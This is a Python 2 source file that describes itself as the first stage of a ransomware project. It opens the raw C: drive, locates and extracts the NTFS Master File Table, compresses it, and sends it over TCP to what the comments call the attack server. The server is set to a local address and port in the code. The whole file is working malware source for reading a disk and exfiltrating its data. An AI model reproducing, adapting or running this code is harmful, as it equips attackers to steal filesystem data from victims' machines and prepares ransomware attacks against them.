#!/usr/bin/python2
import os
import ctypes
import struct
import binascii
from StringIO import StringIO
import socket
import zipfile
import MFTFieldsExtractor

"""
********************************************************************************************
A class in charge of retrieving the Master File Table (MFT) record for an NTFS file system
and send it off to the attack server over TCP in a compressed manner.
Serves as an initial stage for the upcoming ransomware.
********************************************************************************************
"""

# constant size values
LONG_LONG_SIZE = ctypes.sizeof(ctypes.c_longlong)
BYTES_SIZE = ctypes.sizeof(ctypes.c_byte)
WORD_SIZE = 2

# constant TCP values
TCP_IP = '127.0.0.1'
TCP_PORT = 6666
BUFFER_SIZE = 1024



class Malware:
    def __init__(self, ntfs_drive, server):
        self.ntfs_drive = ntfs_drive
        self.server = server

    def connect_to_server_and_send(self, filename, server_ip, port):
        """
        connect to the malware server and send the MFT table through it
        :param filename: the zipped MFT file to be sent
        :param server_ip: TCP IP
        :param port: TCP Port
        """
        # connecting to server
        self.server.connect((server_ip, port))

        # sending the file through TCP in chunks
        f = open(filename, "rb")
        z = f.read(BUFFER_SIZE)
        while z:
            self.server.send(z)
            z = f.read(BUFFER_SIZE)

        # done sending, the server is no longer in use
        self.server.close()

    def decode_MFT_and_write_to_file(self, mft_raw, mft_file_name):
        """
        decoding MFT headers and data runs
        (explanation on data runs can be found here: http://inform.pucp.edu.pe/~inf232/Ntfs/ntfs_doc_v0.5/concepts/data_runs.html)
        writing the decoded MFT records to the MFT file.
        :param mft_raw: MFT log file record
        :param mft_file_name: MFT file name
        """
        mft_dict = {'attr_off': struct.unpack("<H", mft_raw[20:22])[0]}
        read_ptr = mft_dict['attr_off']

        mft = open(mft_file_name, 'wb')

        while read_ptr < len(mft_raw):
            atr_record = MFTFieldsExtractor.decode_atr_header(mft_raw[read_ptr:])
            if atr_record['type'] == 0x80:
                data_runs = mft_raw[read_ptr + atr_record['run_off']:read_ptr + atr_record['len']]
                prev_seek = 0
                # write the MFT to the MFT file, record-by-record
                for length, cluster in MFTFieldsExtractor.decode_data_runs(data_runs):
                    # seeking the correct place of the MFT record
                    if prev_seek == 0:
                        self.ntfs_drive.seek(cluster * bytes_per_sector * sectors_per_cluster)
                    else:
                        new_pos = prev_seek + (cluster * bytes_per_sector * sectors_per_cluster)
                        self.ntfs_drive.seek(new_pos)
                    prev_seek = self.ntfs_drive.tell()
                    # writing the MFT record to the MFT file
                    mft.write(self.ntfs_drive.read(length * bytes_per_sector * sectors_per_cluster))
                break
            if atr_record['len'] > 0:
                read_ptr += atr_record['len']
        mft.close()


def create_socket_server():
    """
    static function - creating a new socket - Low-level networking interface
    """
    return socket.socket(socket.AF_INET, socket.SOCK_STREAM)


def compute_mft_location(ntfs_file):
    """
    static function - in order to extract the MFT table from the ntfs, we need to find the cluster number of the MFT
    and then multiply that number by the number of sectors per cluster, and multiply that by bytes per sector
    this function retrieves these 3 fields from the ntfs file
    Explanation to this can be found here:
    https://en.wikipedia.org/wiki/NTFS#Partition_Boot_Sector_(VBR)
    :param ntfs_file: the NTFS file system log.
    :return: Bytes Per Sector, Sectors Per Cluster and MFT Cluster Number, in order to calculate mft location
    """

    # bytes per sector
    ntfs_file.seek(0x0b)
    bytes_per_sector = ntfs_file.read(WORD_SIZE)
    bytes_per_sector = struct.unpack('<h', binascii.unhexlify(binascii.hexlify(bytes_per_sector)))[0]

    # sectors per cluster
    ntfs_file.seek(0x0d)
    sectors_per_cluster = ntfs_file.read(BYTES_SIZE)
    sectors_per_cluster = struct.unpack('<b', binascii.unhexlify(binascii.hexlify(sectors_per_cluster)))[0]

    # get MTF logical cluster number
    ntfs_file.seek(0x30)
    mft_cluster_number = ntfs_file.read(LONG_LONG_SIZE)
    mft_cluster_number = struct.unpack('<q', binascii.unhexlify(binascii.hexlify(mft_cluster_number)))[0]

    return bytes_per_sector, sectors_per_cluster, mft_cluster_number


def compress(file_name):
    """
    static function - zip (compress) a file
    :param file_name: the name of the file to be compressed
    :return: the name of the zipped file
    """
    name, file_extension = os.path.splitext(file_name)
    zip_name = name + '.zip'
    z = zipfile.ZipFile(zip_name, 'w')
    z.write(file_name, compress_type=zipfile.ZIP_DEFLATED)
    z.close()
    return zip_name


if __name__ == '__main__':

    malware = Malware(ntfs_drive=file(r'\\.\C:', 'rb'), server=create_socket_server())
    if os.name == 'nt':
        # windows can't seek a drive to individual bytes, so convert ntfs to stringio to make it seekable
        ntfs = malware.ntfs_drive.read(512)
        ntfs_file = StringIO(ntfs)
    else:
        ntfs_file = malware.ntfs_drive

    # finding the MFT location in the NTFS file
    bytes_per_sector, sectors_per_cluster, mft_cluster_number = compute_mft_location(ntfs_file)

    # MFT is then at NTFS + (bytes_per_sector * sectors_per_cluster * mft_cluster_number)
    mft_loc = long(bytes_per_sector * sectors_per_cluster * mft_cluster_number)
    malware.ntfs_drive.seek(0)
    malware.ntfs_drive.seek(mft_loc)
    mft_raw = malware.ntfs_drive.read(1024)

    # We've got the MFT log file record for the MFT itself.
    # parse it to the DATA section, decode the data runs, compress MFT and send the compressed file over TCP
    malware.decode_MFT_and_write_to_file(mft_raw, "MFT.mft")
    zip_name = compress('MFT.mft')
    malware.connect_to_server_and_send(zip_name, TCP_IP, TCP_PORT)
